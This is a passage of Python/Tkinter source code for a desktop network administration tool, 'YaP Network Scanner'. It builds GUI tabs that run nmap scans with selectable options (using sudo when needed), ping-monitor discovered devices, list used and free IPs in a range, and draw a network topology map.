            self.tray_icon = pystray.Icon("YaP Network Scanner", tray_image, 
                                         "YaP Network Scanner", menu)
            
            self.tray_thread = threading.Thread(target=self.tray_icon.run, daemon=True)
            self.tray_thread.start()
        except Exception as e:
            print(f"Warning: Could not setup system tray: {e}")
            self.tray_icon = None
    
    def show_window(self, icon=None, item=None):
        """Show the main window."""
        self.root.deiconify()
        self.root.lift()
        self.root.focus_force()
        self.hidden_to_tray = False
    
    def hide_to_tray(self):
        """Hide window to system tray."""
        if self.tray_icon:
            self.root.withdraw()
            self.hidden_to_tray = True
    
    def quit_application(self, icon=None, item=None):
        """Quit the application."""
        if self.tray_icon:
            self.tray_icon.stop()
        self.root.quit()
        self.root.destroy()
    
    def create_nmap_tab(self, parent):
        """Create the Nmap scanner tab."""
        # Check if nmap is available
        nmap_available = self.scanner.has_nmap
        
        # Top section - Nmap status and target
        top_frame = ttk.LabelFrame(parent, text="Nmap Configuration", padding="10")
        top_frame.pack(fill=tk.X, pady=(0, 10))
        top_frame.columnconfigure(1, weight=1)
        
        # Nmap availability
        nmap_status_text = "✓ Nmap is available" if nmap_available else "✗ Nmap is not installed"
        nmap_status_color = "#00AA00" if nmap_available else "#CC0000"
        ttk.Label(top_frame, text="Status:", font=("Segoe UI", 9, "bold")).grid(row=0, column=0, sticky=tk.W, pady=2)
        nmap_status_label = ttk.Label(top_frame, text=nmap_status_text, font=("Segoe UI", 9), 
                                     foreground=nmap_status_color)
        nmap_status_label.grid(row=0, column=1, sticky=tk.W, padx=(10, 0), pady=2)
        
        if not nmap_available:
            install_hint = ttk.Label(top_frame, 
                                    text="Install nmap: sudo apt install nmap (Debian/Ubuntu) or sudo pacman -S nmap (Arch)",
                                    font=("Segoe UI", 8), foreground="#666666")
            install_hint.grid(row=0, column=2, columnspan=2, sticky=tk.W, padx=(10, 0), pady=2)
        
        # Target selection
        ttk.Label(top_frame, text="Target:", font=("Segoe UI", 9, "bold")).grid(row=1, column=0, sticky=tk.W, pady=5)
        self.nmap_target_var = tk.StringVar()
        target_entry = ttk.Entry(top_frame, textvariable=self.nmap_target_var, width=30, font=("Consolas", 9))
        target_entry.grid(row=1, column=1, sticky=(tk.W, tk.E), padx=(10, 0), pady=5)
        target_entry.bind('<Return>', lambda e: self.run_nmap_scan())
        
        # Use selected device button
        use_device_btn = ttk.Button(top_frame, text="Use Selected Device", command=self.use_selected_for_nmap)
        use_device_btn.grid(row=1, column=2, padx=(10, 0), pady=5)
        
        # Ports to scan
        ttk.Label(top_frame, text="Ports:", font=("Segoe UI", 9, "bold")).grid(row=2, column=0, sticky=tk.W, pady=5)
        self.nmap_ports_var = tk.StringVar()
        ports_entry = ttk.Entry(top_frame, textvariable=self.nmap_ports_var, width=30, font=("Consolas", 9))
        ports_entry.grid(row=2, column=1, sticky=(tk.W, tk.E), padx=(10, 0), pady=5)
        ports_entry.bind('<Return>', lambda e: self.run_nmap_scan())
        
        ttk.Label(top_frame, text="(e.g., 80,443,8080-8090 or 1-65535)", 
                 font=("Segoe UI", 8), foreground="#666666").grid(row=2, column=2, sticky=tk.W, padx=(10, 0), pady=5)
        
        # Nmap options/switches
        options_frame = ttk.LabelFrame(parent, text="Nmap Options", padding="10")
        options_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Scan type options
        scan_type_frame = ttk.Frame(options_frame)
        scan_type_frame.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Label(scan_type_frame, text="Scan Type:", font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=(0, 10))
        self.nmap_scan_type = tk.StringVar(value="syn")
        
        ttk.Radiobutton(scan_type_frame, text="SYN Scan (-sS)", variable=self.nmap_scan_type, 
                       value="syn").pack(side=tk.LEFT, padx=(0, 10))
        ttk.Radiobutton(scan_type_frame, text="Connect Scan (-sT)", variable=self.nmap_scan_type, 
                       value="connect").pack(side=tk.LEFT, padx=(0, 10))
        ttk.Radiobutton(scan_type_frame, text="UDP Scan (-sU)", variable=self.nmap_scan_type, 
                       value="udp").pack(side=tk.LEFT, padx=(0, 10))
        ttk.Radiobutton(scan_type_frame, text="Service Detection (-sV)", variable=self.nmap_scan_type, 
                       value="service").pack(side=tk.LEFT, padx=(0, 10))
        
        # Additional options
        options_row = ttk.Frame(options_frame)
        options_row.pack(fill=tk.X, pady=5)
        
        self.nmap_skip_discovery = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_row, text="Skip Host Discovery (-Pn)", 
                       variable=self.nmap_skip_discovery).pack(side=tk.LEFT, padx=(0, 10))
        
        self.nmap_os_detection = tk.BooleanVar(value=False)
        ttk.Checkbutton(options_row, text="OS Detection (-O)", 
                       variable=self.nmap_os_detection).pack(side=tk.LEFT, padx=(0, 10))
        
        self.nmap_aggressive = tk.BooleanVar(value=False)
        ttk.Checkbutton(options_row, text="Aggressive Scan (-A)", 
                       variable=self.nmap_aggressive).pack(side=tk.LEFT, padx=(0, 10))
        
        self.nmap_verbose = tk.BooleanVar(value=False)
        ttk.Checkbutton(options_row, text="Verbose (-v)", 
                       variable=self.nmap_verbose).pack(side=tk.LEFT, padx=(0, 10))
        
        # Scan button
        button_frame = ttk.Frame(options_frame)
        button_frame.pack(fill=tk.X, pady=(5, 0))
        
        self.nmap_scan_btn = ttk.Button(button_frame, text="Run Nmap Scan", command=self.run_nmap_scan,
                                       state="normal" if nmap_available else "disabled")
        self.nmap_scan_btn.pack(side=tk.LEFT, padx=(0, 10))
        
        self.nmap_stop_btn = ttk.Button(button_frame, text="Stop", command=self.stop_nmap_scan, state="disabled")
        self.nmap_stop_btn.pack(side=tk.LEFT)
        
        # Progress label
        self.nmap_progress_label = ttk.Label(options_frame, text="", foreground="#0066CC", font=("Segoe UI", 9))
        self.nmap_progress_label.pack(fill=tk.X, pady=(5, 0))
        
        # Results display
        results_frame = ttk.LabelFrame(parent, text="Nmap Scan Results", padding="10")
        results_frame.pack(fill=tk.BOTH, expand=True)
        
        # Results text area with scrollbar
        results_text_frame = ttk.Frame(results_frame)
        results_text_frame.pack(fill=tk.BOTH, expand=True)
        
        results_scrollbar = ttk.Scrollbar(results_text_frame)
        results_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.nmap_results_text = scrolledtext.ScrolledText(results_text_frame, wrap=tk.WORD, 
                                                           font=("Consolas", 9), 
                                                           yscrollcommand=results_scrollbar.set,
                                                           state="disabled")
        self.nmap_results_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        results_scrollbar.config(command=self.nmap_results_text.yview)
        
        # Configure text tags for error formatting
        self.nmap_results_text.tag_config("error", foreground="#CC0000")
        self.nmap_results_text.tag_config("success", foreground="#00AA00")
        
        # Footer for nmap tab
        nmap_footer = ttk.Label(parent, text="© YaP Labs", font=("Segoe UI", 8), foreground="#999999")
        nmap_footer.pack(side=tk.BOTTOM, pady=(5, 0))
        
        # Store nmap process
        self.nmap_process = None
        self.nmap_scanning = False
    
    def use_selected_for_nmap(self):
        """Use the selected device's IP for nmap scan."""
        if self.selected_device:
            self.nmap_target_var.set(self.selected_device.ip)
        else:
            messagebox.showwarning("No Selection", "Please select a device from the device list first.")
    
    def prompt_password(self, title="Root Password Required", message="This scan requires root privileges.\nPlease enter your password:"):
        """Prompt for password using a secure dialog."""
        # Create a custom dialog for password input
        dialog = tk.Toplevel(self.root)
        dialog.title(title)
        dialog.geometry("400x150")
        dialog.resizable(False, False)
        dialog.transient(self.root)
        dialog.grab_set()
        
        # Position dialog on the same monitor as the main window
        dialog.update_idletasks()
        
        # Get main window position
        main_x = self.root.winfo_x()
        main_y = self.root.winfo_y()
        main_width = self.root.winfo_width()
        main_height = self.root.winfo_height()
        
        # Get dialog dimensions
        dialog_width = dialog.winfo_width()
        dialog_height = dialog.winfo_height()
        
        # Center dialog relative to main window
        x = main_x + (main_width // 2) - (dialog_width // 2)
        y = main_y + (main_height // 2) - (dialog_height // 2)
        
        # Ensure dialog stays on screen (in case main window is partially off-screen)
        screen_width = dialog.winfo_screenwidth()
        screen_height = dialog.winfo_screenheight()
        
        # Get the screen that contains the main window
        # Find which screen the main window is on
        if main_x < 0:
            x = max(0, x)
        elif main_x + main_width > screen_width:
            x = min(screen_width - dialog_width, x)
        
        if main_y < 0:
            y = max(0, y)
        elif main_y + main_height > screen_height:
            y = min(screen_height - dialog_height, y)
        
        dialog.geometry(f"+{x}+{y}")
        
        password_var = tk.StringVar()
        result = {'password': None, 'cancelled': False}
        
        # Message label
        msg_label = ttk.Label(dialog, text=message, font=("Segoe UI", 9), wraplength=350)
        msg_label.pack(pady=(20, 10))
        
        # Password entry
        password_frame = ttk.Frame(dialog)
        password_frame.pack(pady=10)
        
        ttk.Label(password_frame, text="Password:", font=("Segoe UI", 9)).pack(side=tk.LEFT, padx=(0, 5))
        password_entry = ttk.Entry(password_frame, textvariable=password_var, show="*", width=30, font=("Consolas", 9))
        password_entry.pack(side=tk.LEFT)
        password_entry.focus()
        
        def on_ok():
            result['password'] = password_var.get()
            dialog.destroy()
        
        def on_cancel():
            result['cancelled'] = True
            dialog.destroy()
        
        def on_enter(event):
            on_ok()
        
        password_entry.bind('<Return>', on_enter)
        dialog.bind('<Escape>', lambda e: on_cancel())
        
        # Buttons
        button_frame = ttk.Frame(dialog)
        button_frame.pack(pady=10)
        
        ttk.Button(button_frame, text="OK", command=on_ok, width=12).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Cancel", command=on_cancel, width=12).pack(side=tk.LEFT, padx=5)
        
        # Wait for dialog to close
        dialog.wait_window()
        
        return result['password'] if not result['cancelled'] else None
    
    def check_root_privileges(self):
        """Check if we have root privileges."""
        return os.geteuid() == 0
    
    def run_nmap_scan(self):
        """Run nmap scan with configured options."""
        if not self.scanner.has_nmap:
            messagebox.showerror("Nmap Not Available", "Nmap is not installed. Please install nmap to use this feature.")
            return
        
        target = self.nmap_target_var.get().strip()
        if not target:
            messagebox.showwarning("Target Required", "Please enter a target IP address or hostname.")
            return
        
        ports = self.nmap_ports_var.get().strip()
        if not ports:
            ports = "1-1000"  # Default port range
        
        # Check if root privileges are needed
        scan_type = self.nmap_scan_type.get()
        needs_root = (scan_type == "syn" or  # SYN scan needs root
                     self.nmap_os_detection.get() or  # OS detection needs root
                     scan_type == "udp")  # UDP scan often needs root
        
        has_root = self.check_root_privileges()
        password = None
        
        # If root is needed and we don't have it, prompt for password
        if needs_root and not has_root:
            password = self.prompt_password(
                "Root Password Required",
                f"This scan requires root privileges:\n"
                f"- Scan type: {scan_type.upper()}\n"
                f"- OS Detection: {'Yes' if self.nmap_os_detection.get() else 'No'}\n\n"
                f"Please enter your password to continue:"
            )
            
            if password is None:
                # User cancelled
                return
            
            if not password:
                messagebox.showerror("Password Required", "Password cannot be empty.")
                return
        
        # Build nmap command
        if has_root or password:
            # We have root or will use sudo
            cmd = ['sudo', '-S', 'nmap']  # -S reads password from stdin
        else:
            cmd = ['nmap']
        
        # Add scan type - MUST be added before other options
        # Only one scan type should be used at a time
        if scan_type == "syn":
            cmd.append('-sS')
        elif scan_type == "connect":
            cmd.append('-sT')
        elif scan_type == "udp":
            cmd.append('-sU')
        elif scan_type == "service":
            cmd.append('-sV')
        else:
            # Default to connect scan if somehow no type is selected
            cmd.append('-sT')
        
        # Add options (these don't conflict with scan type)
        if self.nmap_skip_discovery.get():
            cmd.append('-Pn')
        
        # OS detection and aggressive scan can be combined with scan types
        # But note: -A includes -sV and -O, so we should avoid duplication
        if self.nmap_aggressive.get():
            # Aggressive scan includes version detection and OS detection
            cmd.append('-A')
        else:
            # Only add OS detection if aggressive is not enabled
            if self.nmap_os_detection.get():
                cmd.append('-O')
        
        if self.nmap_verbose.get():
            cmd.append('-v')
        
        # Add ports and target
        cmd.extend(['-p', ports, target])
        
        # Clear previous results
        self.nmap_results_text.config(state="normal")
        self.nmap_results_text.delete(1.0, tk.END)
        self.nmap_results_text.insert(tk.END, f"Running nmap scan...\n")
        self.nmap_results_text.insert(tk.END, f"Scan Type: {scan_type.upper()}\n")
        self.nmap_results_text.insert(tk.END, f"Command: {' '.join(cmd)}\n")
        self.nmap_results_text.insert(tk.END, f"{'='*60}\n\n")
        self.nmap_results_text.config(state="disabled")
        
        # Disable scan button, enable stop button
        self.nmap_scan_btn.config(state="disabled")
        self.nmap_stop_btn.config(state="normal")
        self.nmap_scanning = True
        
        # Run nmap in thread
        def nmap_thread():
            try:
                self.nmap_progress_label.config(text="Running nmap scan...", foreground="#0066CC")
                
                # Prepare process arguments
                process_kwargs = {
                    'stdout': subprocess.PIPE,
                    'stderr': subprocess.STDOUT,
                    'text': True,
                    'bufsize': 1,
                    'universal_newlines': True
                }
                
                # If we need to use sudo with password, provide it via stdin
                if password:
                    process_kwargs['stdin'] = subprocess.PIPE
                
                # Run nmap with combined stdout/stderr
                self.nmap_process = subprocess.Popen(cmd, **process_kwargs)
                
                # If password is needed, write it to stdin
                if password:
                    try:
                        self.nmap_process.stdin.write(password + '\n')
                        self.nmap_process.stdin.flush()
                        self.nmap_process.stdin.close()
                    except:
                        pass  # stdin might be closed already
                
                # Read output in real-time
                password_error = False
                while True:
                    if not self.nmap_scanning:
                        self.nmap_process.terminate()
                        break
                    
                    line = self.nmap_process.stdout.readline()
                    if not line:
                        if self.nmap_process.poll() is not None:
                            break
                        continue
                    
                    # Check for password errors
                    line_lower = line.lower()
                    if 'password' in line_lower and ('incorrect' in line_lower or 'wrong' in line_lower or 'try again' in line_lower):
                        password_error = True
                        self.root.after(0, lambda: self.on_nmap_error("Incorrect password. Please try again."))
                        break
                    
                    # Check if line contains error indicators
                    is_error = any(indicator in line_lower for indicator in ['error', 'failed', 'warning', 'permission denied'])
                    self.root.after(0, lambda l=line, err=is_error: self.append_nmap_output(l, is_error=err))
                
                if not password_error:
                    # Wait for process to complete
                    return_code = self.nmap_process.wait()
                    
                    # Update UI
                    self.root.after(0, lambda: self.on_nmap_complete(return_code == 0))
                
            except Exception as e:
                self.root.after(0, lambda: self.on_nmap_error(str(e)))
        
        threading.Thread(target=nmap_thread, daemon=True).start()
    
    def append_nmap_output(self, line: str, is_error: bool = False):
        """Append nmap output to results text area."""
        self.nmap_results_text.config(state="normal")
        if is_error:
            self.nmap_results_text.insert(tk.END, f"[ERROR] {line}", "error")
        else:
            self.nmap_results_text.insert(tk.END, line)
        self.nmap_results_text.see(tk.END)
        self.nmap_results_text.config(state="disabled")
    
    def on_nmap_complete(self, success: bool):
        """Handle nmap scan completion."""
        self.nmap_scan_btn.config(state="normal")
        self.nmap_stop_btn.config(state="disabled")
        self.nmap_scanning = False
        
        if success:
            self.nmap_progress_label.config(text="Scan completed successfully!", foreground="#00AA00")
        else:
            self.nmap_progress_label.config(text="Scan completed with errors", foreground="#CC0000")
    
    def on_nmap_error(self, error: str):
        """Handle nmap scan error."""
        self.nmap_scan_btn.config(state="normal")
        self.nmap_stop_btn.config(state="disabled")
        self.nmap_scanning = False
        self.nmap_progress_label.config(text=f"Error: {error}", foreground="#CC0000")
        self.append_nmap_output(f"\n[ERROR] {error}\n", is_error=True)
    
    def stop_nmap_scan(self):
        """Stop the running nmap scan."""
        if self.nmap_process:
            try:
                self.nmap_process.terminate()
                self.nmap_process.wait(timeout=2)
            except:
                try:
                    self.nmap_process.kill()
                except:
                    pass
        
        self.nmap_scanning = False
        self.nmap_scan_btn.config(state="normal")
        self.nmap_stop_btn.config(state="disabled")
        self.nmap_progress_label.config(text="Scan stopped by user", foreground="#CC0000")
        self.append_nmap_output("\n[SCAN STOPPED BY USER]\n")
    
    def create_monitoring_tab(self, parent):
        """Create the Network Monitoring tab."""
        # Top section - Monitoring controls
        control_frame = ttk.LabelFrame(parent, text="Monitoring Controls", padding="10")
        control_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Monitoring status
        status_frame = ttk.Frame(control_frame)
        status_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.monitoring_active = tk.BooleanVar(value=False)
        ttk.Checkbutton(status_frame, text="Enable Real-time Monitoring", 
                      variable=self.monitoring_active,
                      command=self.toggle_monitoring).pack(side=tk.LEFT, padx=(0, 10))
        
        self.monitoring_status_label = ttk.Label(status_frame, text="Stopped", 
                                                 foreground="#CC0000", font=("Segoe UI", 9, "bold"))
        self.monitoring_status_label.pack(side=tk.LEFT)
        
        # Monitoring interval
        interval_frame = ttk.Frame(control_frame)
        interval_frame.pack(fill=tk.X)
        
        ttk.Label(interval_frame, text="Check Interval (seconds):", font=("Segoe UI", 9)).pack(side=tk.LEFT, padx=(0, 5))
        self.monitoring_interval_var = tk.StringVar(value="30")
        ttk.Spinbox(interval_frame, from_=5, to=300, textvariable=self.monitoring_interval_var, 
                   width=10).pack(side=tk.LEFT, padx=(0, 10))
        
        ttk.Button(interval_frame, text="Refresh Now", command=self.refresh_monitoring).pack(side=tk.LEFT)
        
        # Device status list
        status_list_frame = ttk.LabelFrame(parent, text="Device Status", padding="10")
        status_list_frame.pack(fill=tk.BOTH, expand=True)
        
        # Treeview for monitoring
        columns = ('Device', 'IP', 'Status', 'Last Check', 'Response Time', 'Uptime')
        self.monitoring_tree = ttk.Treeview(status_list_frame, columns=columns, show='headings', height=22)
        
        for col in columns:
            self.monitoring_tree.heading(col, text=col)
            self.monitoring_tree.column(col, width=150)
        
        self.monitoring_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        scrollbar_mon = ttk.Scrollbar(status_list_frame, orient=tk.VERTICAL, command=self.monitoring_tree.yview)
        scrollbar_mon.pack(side=tk.RIGHT, fill=tk.Y)
        self.monitoring_tree.config(yscrollcommand=scrollbar_mon.set)
        
        # Monitoring thread
        self.monitoring_thread = None
        self.monitoring_running = False
        self.device_statuses = {}
    
    def toggle_monitoring(self):
        """Toggle monitoring on/off."""
        if self.monitoring_active.get():
            self.start_monitoring()
        else:
            self.stop_monitoring()
    
    def start_monitoring(self):
        """Start network monitoring."""
        if self.monitoring_running:
            return
        
        self.monitoring_running = True
        self.monitoring_status_label.config(text="Running", foreground="#00AA00")
        
        def monitor_loop():
            while self.monitoring_running:
                interval = int(self.monitoring_interval_var.get())
                self.check_all_devices()
                threading.Event().wait(interval)
        
        self.monitoring_thread = threading.Thread(target=monitor_loop, daemon=True)
        self.monitoring_thread.start()
    
    def stop_monitoring(self):
        """Stop network monitoring."""
        self.monitoring_running = False
        self.monitoring_status_label.config(text="Stopped", foreground="#CC0000")
    
    def check_all_devices(self):
        """Check status of all discovered devices."""
        for ip, device in self.devices.items():
            if not self.monitoring_running:
                break
            status = self.scanner.ping_host(ip)
            response_time = "N/A"
            if status:
                # Try to get response time
                try:
                    import time
                    start = time.time()
                    self.scanner.ping_host(ip)
                    response_time = f"{(time.time() - start) * 1000:.0f}ms"
                except:
                    pass
            
            self.device_statuses[ip] = {
                'status': 'Online' if status else 'Offline',
                'last_check': time.strftime("%H:%M:%S"),
                'response_time': response_time
            }
            
            self.root.after(0, lambda ip=ip, device=device, status=status, rt=response_time: 
                          self.update_monitoring_display(ip, device, status, rt))
    
    def update_monitoring_display(self, ip, device, is_online, response_time):
        """Update monitoring display for a device."""
        # Find existing item or create new
        item_id = None
        for item in self.monitoring_tree.get_children():
            if self.monitoring_tree.item(item, 'values')[1] == ip:
                item_id = item
                break
        
        status_text = "Online" if is_online else "Offline"
        status_color = "#00AA00" if is_online else "#CC0000"
        
        values = (
            device.get_display_name(),
            ip,
            status_text,
            time.strftime("%H:%M:%S"),
            response_time,
            "N/A"  # Uptime would need tracking
        )
        
        if item_id:
            self.monitoring_tree.item(item_id, values=values, tags=(status_text,))
        else:
            item_id = self.monitoring_tree.insert('', tk.END, values=values, tags=(status_text,))
        
        self.monitoring_tree.tag_configure("Online", foreground="#00AA00")
        self.monitoring_tree.tag_configure("Offline", foreground="#CC0000")
    
    def refresh_monitoring(self):
        """Manually refresh monitoring status."""
        if self.devices:
            self.check_all_devices()
        else:
            messagebox.showinfo("No Devices", "Please scan the network first to discover devices.")
    
    def create_ipam_tab(self, parent):
        """Create the IP Address Management (IPAM) tab."""
        # Top section - IP range management
        control_frame = ttk.LabelFrame(parent, text="IP Range Management", padding="10")
        control_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Network range input
        range_frame = ttk.Frame(control_frame)
        range_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(range_frame, text="Network Range:", font=("Segoe UI", 9)).pack(side=tk.LEFT, padx=(0, 5))
        self.ipam_network_var = tk.StringVar()
        ttk.Entry(range_frame, textvariable=self.ipam_network_var, width=25, 
                 font=("Consolas", 9)).pack(side=tk.LEFT, padx=(0, 10))
        
        ttk.Button(range_frame, text="Analyze Range", command=self.analyze_ip_range).pack(side=tk.LEFT)
        
        # IP allocation display
        allocation_frame = ttk.LabelFrame(parent, text="IP Address Allocation", padding="10")
        allocation_frame.pack(fill=tk.BOTH, expand=True)
        
        # Summary
        summary_frame = ttk.Frame(allocation_frame)
        summary_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.ipam_total_label = ttk.Label(summary_frame, text="Total IPs: 0", font=("Segoe UI", 9))
        self.ipam_total_label.pack(side=tk.LEFT, padx=(0, 20))
        
        self.ipam_used_label = ttk.Label(summary_frame, text="Used: 0", font=("Segoe UI", 9), foreground="#CC0000")
        self.ipam_used_label.pack(side=tk.LEFT, padx=(0, 20))
        
        self.ipam_free_label = ttk.Label(summary_frame, text="Free: 0", font=("Segoe UI", 9), foreground="#00AA00")
        self.ipam_free_label.pack(side=tk.LEFT)
        
        # IP list
        ip_list_frame = ttk.Frame(allocation_frame)
        ip_list_frame.pack(fill=tk.BOTH, expand=True)
        
        columns = ('IP Address', 'Status', 'Device', 'MAC Address', 'Last Seen')
        self.ipam_tree = ttk.Treeview(ip_list_frame, columns=columns, show='headings', height=20)
        
        for col in columns:
            self.ipam_tree.heading(col, text=col)
            self.ipam_tree.column(col, width=150)
        
        scrollbar_ipam = ttk.Scrollbar(ip_list_frame, orient=tk.VERTICAL, command=self.ipam_tree.yview)
        scrollbar_ipam.pack(side=tk.RIGHT, fill=tk.Y)
        self.ipam_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.ipam_tree.config(yscrollcommand=scrollbar_ipam.set)
    
    def analyze_ip_range(self):
        """Analyze IP range and show allocation."""
        network = self.ipam_network_var.get().strip()
        if not network:
            messagebox.showwarning("Network Required", "Please enter a network range (e.g., 192.168.1.0/24)")
            return
        
        try:
            import ipaddress
            net = ipaddress.IPv4Network(network, strict=False)
            
            # Clear existing items
            self.ipam_tree.delete(*self.ipam_tree.get_children())
            
            # Get all IPs in range
            total_ips = len(list(net.hosts()))
            used_ips = set()
            
            # Check which IPs are used (from discovered devices)
            for device in self.devices.values():
                try:
                    ip = ipaddress.IPv4Address(device.ip)
                    if ip in net:
                        used_ips.add(str(ip))
                        self.ipam_tree.insert('', tk.END, values=(
                            device.ip,
                            "Used",
                            device.get_display_name(),
                            device.mac_address,
                            "N/A"
                        ), tags=("used",))
                except:
                    pass
            
            # Show free IPs (sample)
            free_count = 0
            for ip in net.hosts():
                ip_str = str(ip)
                if ip_str not in used_ips:
                    free_count += 1
                    if free_count <= 100:  # Limit display
                        self.ipam_tree.insert('', tk.END, values=(
                            ip_str,
                            "Free",
                            "",
                            "",
                            ""
                        ), tags=("free",))
            
            # Update summary
            self.ipam_total_label.config(text=f"Total IPs: {total_ips}")
            self.ipam_used_label.config(text=f"Used: {len(used_ips)}")
            self.ipam_free_label.config(text=f"Free: {total_ips - len(used_ips)}")
            
            self.ipam_tree.tag_configure("used", foreground="#CC0000")
            self.ipam_tree.tag_configure("free", foreground="#00AA00")
            
        except Exception as e:
            messagebox.showerror("Error", f"Invalid network range: {str(e)}")
    
    def create_network_mapping_tab(self, parent):
        """Create the Network Mapping tab."""
        # Control frame
        control_frame = ttk.LabelFrame(parent, text="Mapping Controls", padding="10")
        control_frame.pack(fill=tk.X, pady=(0, 10))
        
        button_frame = ttk.Frame(control_frame)
        button_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Left side - buttons
        left_buttons = ttk.Frame(button_frame)
        left_buttons.pack(side=tk.LEFT)
        
        ttk.Button(left_buttons, text="Generate Network Map", 
                  command=self.generate_network_map).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(left_buttons, text="Refresh Map", 
                  command=self.refresh_network_map).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(left_buttons, text="Detect Connections", 
                  command=self.detect_network_connections).pack(side=tk.LEFT, padx=(0, 20))
        
        # Right side - Connection Legend
        legend_frame = ttk.LabelFrame(button_frame, text="Connection Legend", padding="5")
        legend_frame.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(20, 0))
        
        legend_inner = ttk.Frame(legend_frame)
        legend_inner.pack(fill=tk.X)
        
        # Ethernet connection
        ethernet_frame = ttk.Frame(legend_inner)
        ethernet_frame.pack(side=tk.LEFT, padx=(0, 15))
        canvas_eth = tk.Canvas(ethernet_frame, width=50, height=15, highlightthickness=0, bg="#F5F5F5")
        canvas_eth.pack(side=tk.LEFT, padx=(0, 5))
        canvas_eth.create_line(5, 7, 45, 7, fill="#0066CC", width=2)
        ttk.Label(ethernet_frame, text="Ethernet (Same Subnet)", font=("Segoe UI", 8)).pack(side=tk.LEFT)
        
        # Routed connection
        routed_frame = ttk.Frame(legend_inner)
        routed_frame.pack(side=tk.LEFT, padx=(0, 15))
        canvas_routed = tk.Canvas(routed_frame, width=50, height=15, highlightthickness=0, bg="#F5F5F5")
        canvas_routed.pack(side=tk.LEFT, padx=(0, 5))
        canvas_routed.create_line(5, 7, 45, 7, fill="#888888", width=1, dash=(5, 5))
        ttk.Label(routed_frame, text="Routed (Different Subnet)", font=("Segoe UI", 8)).pack(side=tk.LEFT)
        
        # Device status
        status_frame = ttk.Frame(legend_inner)
        status_frame.pack(side=tk.LEFT)
        canvas_status = tk.Canvas(status_frame, width=30, height=15, highlightthickness=0, bg="#F5F5F5")
        canvas_status.pack(side=tk.LEFT, padx=(0, 5))
        canvas_status.create_oval(5, 5, 10, 10, fill="#00AA00", outline="#00AA00")
        canvas_status.create_oval(20, 5, 25, 10, fill="#CC0000", outline="#CC0000")
        ttk.Label(status_frame, text="Online / Offline", font=("Segoe UI", 8)).pack(side=tk.LEFT)
        
        # Options frame
        options_frame = ttk.Frame(control_frame)
        options_frame.pack(fill=tk.X)
        
        self.show_link_speed = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="Show Link Speeds", 
                       variable=self.show_link_speed).pack(side=tk.LEFT, padx=(0, 10))
        
        self.show_connections = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="Show Connections", 
                       variable=self.show_connections).pack(side=tk.LEFT)
        
        # Map display area
        map_frame = ttk.LabelFrame(parent, text="Network Topology", padding="10")
        map_frame.pack(fill=tk.BOTH, expand=True)
        
        # Use a canvas for network visualization
        self.network_canvas = tk.Canvas(map_frame, bg="white", relief=tk.SUNKEN, borderwidth=2)
        self.network_canvas.pack(fill=tk.BOTH, expand=True)
        
        # Scrollbars for canvas
        v_scrollbar = ttk.Scrollbar(map_frame, orient=tk.VERTICAL, command=self.network_canvas.yview)
        h_scrollbar = ttk.Scrollbar(map_frame, orient=tk.HORIZONTAL, command=self.network_canvas.xview)
        self.network_canvas.config(yscrollcommand=v_scrollbar.set, xscrollcommand=h_scrollbar.set)
        
        v_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        h_scrollbar.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Info label
        self.map_info_label = ttk.Label(map_frame, text="Click 'Generate Network Map' to visualize your network", 
                                       font=("Segoe UI", 9), foreground="#666666")
        self.map_info_label.pack(pady=5)
        
        # Bind mouse events for dragging devices
        self.network_canvas.bind("<Button-1>", self.on_canvas_click)
        self.network_canvas.bind("<B1-Motion>", self.on_canvas_drag)
        self.network_canvas.bind("<ButtonRelease-1>", self.on_canvas_release)
        
        # Store network connections and link speeds
        self.network_connections = {}  # {(ip1, ip2): {'speed': '100Mbps', 'type': 'ethernet'}}
        
        # Store device positions for dragging
        self.device_positions = {}  # {ip: (x, y)}
        self.dragged_device = None  # Currently dragged device IP
        self.drag_start_pos = None  # Starting position for drag
        self.last_redraw_time = 0  # Throttle connection redraws
    
    def detect_network_connections(self):
        """Detect network connections and link speeds between devices."""
        if not self.devices:
            messagebox.showinfo("No Devices", "Please scan the network first.")
            return
        
        self.network_connections = {}
        devices_list = list(self.devices.values())
        
        # Get local network interface info
        try:
            import psutil
            net_if_addrs = psutil.net_if_addrs()
            net_if_stats = psutil.net_if_stats()
        except ImportError:
            net_if_addrs = {}
            net_if_stats = {}
        
        # Try to determine connection topology
        # Group devices by subnet to show logical connections
        subnets = {}
        for device in devices_list:
            try:
                import ipaddress
                ip = ipaddress.IPv4Address(device.ip)
                # Get subnet (assuming /24)
                subnet = ipaddress.IPv4Network(f"{ip}/24", strict=False)
                subnet_str = str(subnet)
                if subnet_str not in subnets:
                    subnets[subnet_str] = []
                subnets[subnet_str].append(device)
            except:
                pass
        
        # Estimate link speeds based on:
        # 1. Same subnet = likely same switch/router = fast connection
        # 2. Different subnets = routed connection
        # 3. Try to detect actual link speed from network interfaces
        
        # Get local device IP
        local_ip = None
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            pass
        
        # Detect connections
        for i, device1 in enumerate(devices_list):
            for device2 in devices_list[i+1:]:
                try:
                    import ipaddress
                    ip1 = ipaddress.IPv4Address(device1.ip)
                    ip2 = ipaddress.IPv4Address(device2.ip)
                    
                    # Check if same subnet
                    subnet1 = ipaddress.IPv4Network(f"{ip1}/24", strict=False)
